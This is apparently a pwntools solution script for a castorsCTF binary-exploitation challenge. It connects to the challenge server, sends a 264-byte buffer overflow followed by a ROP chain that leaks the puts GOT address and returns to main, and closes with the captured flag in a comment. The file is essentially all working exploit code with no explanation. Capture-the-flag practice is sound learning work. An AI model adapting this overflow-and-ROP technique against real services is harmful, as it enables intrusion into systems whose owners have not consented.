from pwn import *
# nc chals20.cybercastors.com 14425

r = remote('chals20.cybercastors.com', 14425)

offset = 264

flag_addr = 0x4006e7
puts_plt = 0x400590
puts_got = 0x601020
main_plt = 0x40074d
pop_rdi = 0x4007f3

payload = ""
payload += "A"*offset
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_plt)

r.sendline(payload)

r.interactive()

# castorsCTF{th4t's_c00l_but_c4n_y0u_g3t_4_sh3ll_n0w?}
